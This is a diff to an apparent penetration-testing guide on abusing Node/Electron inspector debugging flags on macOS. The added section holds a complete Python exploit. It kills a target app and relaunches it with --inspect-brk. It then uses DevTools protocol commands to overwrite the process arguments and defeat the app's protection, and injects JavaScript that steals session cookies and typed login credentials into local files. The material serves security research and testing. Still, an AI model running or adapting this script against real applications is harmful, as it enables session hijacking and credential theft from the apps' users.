@@ -172,6 +172,216 @@ For example:
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
 
+In [**this blogpost**](https://hackerone.com/reports/1274695), this debugging is abused to make a headless chrome **download arbitrary files in arbitrary locations**.
+
+> [!TIP]
+> If an app has its custom way to check if env variables or params such as `--inspect` are set, you could try to **bypass** it in runtime using the arg `--inspect-brk` which will **stop the execution** at the beggining the app and execute a bypass (overwritting the args or the env variables of the current process for example).
+
+The folllowing was an exploit that monitoring and executing the app with the param `--inspect-brk` it was possible to bypass the custom protection it had (overwritting the params of the process to remove `--inspect-brk`) and then injecting a JS payload to dump cookies and credentials from the app:
+
+```python
+import asyncio
+import websockets
+import json
+import requests
+import os
+import psutil
+from time import sleep
+
+INSPECT_URL = None
+CONT = 0
+CONTEXT_ID = None
+NAME = None
+UNIQUE_ID = None
+
+JS_PAYLOADS = """
+var { webContents } = require('electron');
+var fs = require('fs');
+
+var wc = webContents.getAllWebContents()[0]
+
+
+function writeToFile(filePath, content) {
+    const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);
+
+    fs.writeFile(filePath, data, (err) => {
+        if (err) {
+            console.error(`Error writing to file ${filePath}:`, err);
+        } else {
+            console.log(`File written successfully at ${filePath}`);
+        }
+    });
+}
+
+function get_cookies() {
+    intervalIdCookies = setInterval(() => {
+        console.log("Checking cookies...");
+        wc.session.cookies.get({})
+        .then((cookies) => {
+            tokenCookie = cookies.find(cookie => cookie.name === "token");
+            if (tokenCookie){
+                writeToFile("/tmp/cookies.txt", cookies);
+                clearInterval(intervalIdCookies);
+                wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
+            }
+        })
+    }, 1000);
+}
+
+function get_creds() {
+    in_location = false;
+    intervalIdCreds = setInterval(() => {
+        if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
+            in_location = true;
+            console.log("Injecting creds logger...");
+            wc.executeJavaScript(`
+                (function() {
+                    email = document.getElementById('login_email_id');
+                    password = document.getElementById('login_password_id');
+                    if (password && email) {
+                        return email.value+":"+password.value;
+                    }
+                })();
+            `).then(result => {
+                writeToFile("/tmp/victim_credentials.txt", result);
+            })
+        }
+        else if (in_location) {
+            wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
+            clearInterval(intervalIdCreds);
+        }
+    }, 10); // Check every 10ms
+    setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
+}
+
+get_cookies();
+get_creds();
+console.log("Payloads injected");
+"""
+
+async def get_debugger_url():
+    """
+    Fetch the local inspector's WebSocket URL from the JSON endpoint.
+    Assumes there's exactly one debug target. 
+    """
+    global INSPECT_URL
+
+    url = "http://127.0.0.1:9229/json"
+    response = requests.get(url)
+    data = response.json()
+    if not data:
+        raise RuntimeError("No debug targets found on port 9229.")
+    # data[0] should contain an object with "webSocketDebuggerUrl"
+    ws_url = data[0].get("webSocketDebuggerUrl")
+    if not ws_url:
+        raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
+    INSPECT_URL = ws_url
+
+
+async def monitor_victim():
+    print("Monitoring victim process...")
+    found = False
+    while not found:
+        sleep(1)  # Check every second
+        for process in psutil.process_iter(attrs=['pid', 'name']):
+            try:
+                # Check if the process name contains "victim"
+                if process.info['name'] and 'victim' in process.info['name']:
+                    found = True
+                    print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
+                    os.kill(process.info['pid'], 9)  # Force kill the process
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                # Handle processes that might have terminated or are inaccessible
+                pass
+    os.system("open /Applications/victim.app --args --inspect-brk")
+
+async def bypass_protections():
+    global CONTEXT_ID, NAME, UNIQUE_ID
+    print(f"Connecting to {INSPECT_URL} ...")
+
+    async with websockets.connect(INSPECT_URL) as ws:
+        data = await send_cmd(ws, "Runtime.enable", get_first=True)
+        CONTEXT_ID = data["params"]["context"]["id"]
+        NAME = data["params"]["context"]["name"]
+        UNIQUE_ID = data["params"]["context"]["uniqueId"]
+        
+        sleep(1)
+
+        await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})
+
+        await send_cmd(ws, "Profiler.enable")
+
+        await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})
+
+        await send_cmd(ws, "Runtime.runIfWaitingForDebugger")
+
+        await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})
+
+        code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
+        await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
+        print("Injected code to bypass protections")
+
+
+async def js_payloads():
+    global CONT, CONTEXT_ID, NAME, UNIQUE_ID
+
+    print(f"Connecting to {INSPECT_URL} ...")
+
+    async with websockets.connect(INSPECT_URL) as ws:
+        data = await send_cmd(ws, "Runtime.enable", get_first=True)
+        CONTEXT_ID = data["params"]["context"]["id"]
+        NAME = data["params"]["context"]["name"]
+        UNIQUE_ID = data["params"]["context"]["uniqueId"]
+        await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
+        await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})
+
+
+
+async def main():
+    await monitor_victim()
+    sleep(3)
+    await get_debugger_url()
+    await bypass_protections()
+
+    sleep(7)
+
+    await js_payloads()
+    
+
+
+async def send_cmd(ws, method, get_first=False, params={}):
+    """
+    Send a command to the inspector and read until we get a response with matching "id".
+    """
+    global CONT
+
+    CONT += 1
+
+    # Send the command
+    await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
+    sleep(0.4)
+
+    # Read messages until we get our command result
+    while True:
+        response = await ws.recv()
+        data = json.loads(response)
+
+        # Print for debugging
+        print(f"[{method} / {CONT}] ->", data)
+
+        if get_first:
+            return data
+
+        # If this message is a response to our command (by matching "id"), break
+        if data.get("id") == CONT:
+            return data
+
+        # Otherwise it's an event or unrelated message; keep reading
+
+if __name__ == "__main__":
+    asyncio.run(main())
+```
+
 > [!CAUTION]
 > If the fuse **`EnableNodeCliInspectArguments`** is disabled, the app will **ignore node parameters** (such as `--inspect`) when launched unless the env variable **`ELECTRON_RUN_AS_NODE`** is set, which will be also **ignored** if the fuse **`RunAsNode`** is disabled.
 >
@@ -189,7 +399,7 @@ ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
 print(ws.recv()
 ```
 
-In [**this blogpost**](https://hackerone.com/reports/1274695), this debugging is abused to make a headless chrome **download arbitrary files in arbitrary locations**.
+
 
 ### Injection from the App Plist
 
